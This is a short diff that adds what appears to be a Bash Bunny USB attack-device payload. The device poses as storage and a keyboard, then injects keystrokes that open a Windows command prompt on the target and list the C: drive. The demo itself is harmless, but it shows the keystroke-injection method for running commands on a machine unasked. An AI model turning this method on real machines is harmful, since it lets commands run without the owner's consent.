@@ -1,0 +1,19 @@
+#!/bin/bash
+
+keyboardLayout="DK"
+export keyboardLayout # If you live in the US, just rem this out
+
+LED GREEN OFF 
+
+ATTACKMODE STORAGE HID # We want to present a storage device and a keyboard to the target
+sleep 5
+
+# Just do a litte fun on the target via the keyboard
+QUACK GUI r
+QUACK STRING cmd
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "dir c:\\"
+QUACK ENTER
+
+LED GREEN ON
